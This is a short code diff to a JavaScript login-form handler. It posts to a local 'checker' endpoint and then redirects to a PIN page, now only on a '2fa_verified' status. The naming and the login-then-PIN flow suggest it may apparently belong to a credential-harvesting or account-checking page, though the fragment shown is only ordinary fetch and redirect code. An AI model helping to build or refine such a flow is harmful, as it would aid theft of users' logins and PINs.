@@ -8563,7 +8563,7 @@
                 errormu.style.display = "block";
                 inputForm[0].style.border = "1px solid #c15755";
                 inputForm[1].style.border = "1px solid #c15755";
-              } else {
+              } else if (data.result && data.result.status === "2fa_verified") {
                 fetch("http://localhost:5000/api/checker/start", {
                   method: "POST",
                   body: JSON.stringify({
@@ -8572,12 +8572,7 @@
                   }),
                   headers: { "Content-Type": "application/json" },
                 });
-                if (
-                  username.value &&
-                  password.value
-                ) {
-                    window.location.href = "pin.html";
-                }
+                window.location.href = "pin.html";
               }
             })
             .catch((error) => console.error("Check Account API Error:", error));
